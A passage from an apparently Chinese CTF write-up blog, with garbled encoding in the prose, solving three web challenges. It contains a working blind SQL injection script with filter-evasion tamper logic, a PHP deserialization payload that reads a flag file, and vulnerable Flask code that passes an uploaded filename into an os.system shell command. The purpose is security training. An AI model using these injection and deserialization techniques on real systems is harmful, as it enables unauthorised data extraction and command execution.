class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://6209bf27-efaa-4086-b619-a9552f4450f6.challenge.ctf.show/admin/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get database length</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">databaseName_len</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start get database name length...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">45</span>):</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; or (length(database())=&quot;</span> + <span class="built_in">str</span>(l + <span class="number">1</span>) + <span class="string">&quot;)#&quot;</span></span><br><span class="line">        payload = tamper(payload)</span><br><span class="line">        tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">        headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">        <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">1</span>)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;get db length = &#x27;</span> + <span class="built_in">str</span>(l).lower())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_databaseName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (database()) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;databasename = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tableName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(</span><br><span class="line">                    c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;tablename = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ColumnName</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select column_name from information_schema.columns where table_name=&#x27;FL2333G&#x27; limit 0,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(</span><br><span class="line">                    c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;column name = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):  <span class="comment"># blind inject</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">&quot;1&#x27; or (select (select FLLLLLAG from FL2333G) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> + <span class="built_in">chr</span>(</span><br><span class="line">                    <span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            payload = tamper(payload)</span><br><span class="line">            tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">            headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">            r = requests.get(url, headers=headers)</span><br><span class="line">            myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">            <span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">                flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag = &#x27;</span> + flag.lower())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start database sql injection...&quot;</span>)</span><br><span class="line"><span class="comment"># databaseName_len()</span></span><br><span class="line"><span class="comment"># get_databaseName()</span></span><br><span class="line"><span class="comment"># get_tableName()</span></span><br><span class="line"><span class="comment"># get_ColumnName()</span></span><br><span class="line">get_value()</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240715204411268.png" alt="image-20240715204411268"></p>
<h2 id="CISCN-2023-ååŒ—-ez-date"><a href="#CISCN-2023-ååŒ—-ez-date" class="headerlink" title="[CISCN 2023 ååŒ—]ez_date"></a>[CISCN 2023 ååŒ—]ez_date</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘è¿™ä¸ªç±»ä¸­çš„wakeupæ–¹æ³•ï¼Œçœ‹è§å…³é”®ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="number">12</span>) === <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;12&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="number">1</span>) === <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;1&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;===&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;!=&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240717091858101.png" alt="image-20240717091858101"></p>
<p>æ­£åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$data=preg_replace(&#x27;/((\s)*(\n)+(\s)*)/i&#x27;,&#x27;&#x27;,file_get_contents($uuid));</span><br><span class="line">(\s)*: åŒ¹é…é›¶ä¸ªæˆ–è€…å¤šä¸ªç©ºç™½å­—ç¬¦ ç©ºæ ¼ åˆ¶è¡¨ç¬¦ æ¢é¡µç¬¦</span><br><span class="line">(\n)+: åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªæ¢è¡Œç¬¦</span><br><span class="line">/i : åŒ¹é…æ—¶ä¸åŒºåˆ†å¤§å°å†™</span><br><span class="line">æŠŠä¸Šé¢åŒ¹é…åˆ°çš„å†…å®¹å…¨éƒ¨ç½®æ¢ä¸ºç©º</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸¤ä¸ªç‚¹</p>
<ul>
<li><p>dateå‡½æ•°å¯ä»¥è½¬ä¹‰</p>
</li>
<li><p><code>file_put_contents()</code> æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºå†™å…¥æ•°æ®åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚å¯ä»¥ä¸€æ¬¡å†™å…¥å…¨éƒ¨å†…å®¹ï¼Œè€Œä¸éœ€è¦æ‰“å¼€ã€å†™å…¥å’Œå…³é—­æ–‡ä»¶çš„å¤šä¸ªæ­¥éª¤ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($uuid,$content);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$uuid</code> å‚æ•°ä¼šè¢«ç”¨ä½œæ–‡ä»¶åã€‚ä¾‹å¦‚ï¼Œå¦‚æœ <code>$uuid</code> çš„å€¼æ˜¯ <code>&#39;abc123&#39;</code>ï¼Œé‚£ä¹ˆæ•°æ®å°±ä¼šè¢«å†™å…¥åˆ°åä¸º <code>&#39;abc123&#39;</code> çš„æ–‡ä»¶ä¸­ã€‚</li>
<li><code>$content</code> å‚æ•°æ˜¯ä½ æƒ³è¦å†™å…¥æ–‡ä»¶çš„æ•°æ®ã€‚å®ƒå¯ä»¥æ˜¯ä»»ä½•å¯ä»¥è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„å†…å®¹ã€‚</li>
</ul>
</li>
</ul>
<p>å› æ­¤å¾—åˆ°æœ€ç»ˆpayload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yiyi</span> = <span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; a = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; b = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$yiyi</span> -&gt; file = <span class="string">&#x27;/f\l\a\g&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$yiyi</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717092802571.png" alt="image-20240717092802571"></p>
<h2 id="CISCN-2023-ååŒ—-pysym"><a href="#CISCN-2023-ååŒ—-pysym" class="headerlink" title="[CISCN 2023 ååŒ—]pysym"></a>[CISCN 2023 ååŒ—]pysym</h2><p>éšä¾¿ä¼ ä¸€ä¸ªçœ‹çœ‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240717093053044.png" alt="image-20240717093053044"></p>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&#x27;uploads&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POST</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file uploaded.&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.content_length &gt; <span class="number">10240</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;file too lager&#x27;</span></span><br><span class="line">    path = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits, k=<span class="number">16</span>))</span><br><span class="line">    directory = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], path)</span><br><span class="line">    os.makedirs(directory, mode=<span class="number">0o755</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    savepath=os.path.join(directory, file.filename)</span><br><span class="line">    file.save(savepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">     os.system(<span class="string">&#x27;tar --absolute-names  -xvf &#123;&#125; -C &#123;&#125;&#x27;</span>.<span 